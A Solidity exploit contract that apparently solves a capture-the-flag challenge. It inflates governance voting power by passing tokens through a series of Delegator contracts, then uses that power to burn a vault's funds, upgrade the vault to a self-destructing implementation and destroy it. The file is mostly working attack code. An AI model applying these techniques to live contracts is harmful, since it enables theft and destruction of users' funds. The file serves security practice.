// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "src/Challenge.sol";
import { console } from "forge-std/console.sol";

contract Exploit {
    Challenge private immutable CHALLENGE;

    constructor(Challenge challenge) {
        CHALLENGE = challenge;
    }

    function exploit() external {

        Vault v = CHALLENGE.vault();
        VaultFactory vf = CHALLENGE.vaultFactory();
        Diamond d = CHALLENGE.diamond();
        HexensCoin hc = CHALLENGE.hexensCoin();

        CHALLENGE.claim();

        for (uint i; i < 10; i++) {
            Delegator dg = new Delegator();
            hc.transfer(address(dg), 10_000 ether);
            dg.delegate(hc);
        }

        v.governanceCall(
            abi.encodeWithSelector(Vault.burn.selector, address(d), uint256(31337))
        );

        v.governanceCall(
            abi.encodeWithSelector(UUPSUpgradeable.upgradeTo.selector, address(new SelfdestructVault()))
        );

        SelfdestructVault(address(v)).destroy();
    }
}

contract Delegator {
    function delegate(HexensCoin hc) external {
        hc.delegate(msg.sender);
        hc.transfer(msg.sender, hc.balanceOf(address(this)));
    }
}

contract SelfdestructVault is Vault {
    function destroy() external {
        selfdestruct(payable(msg.sender));
    }
}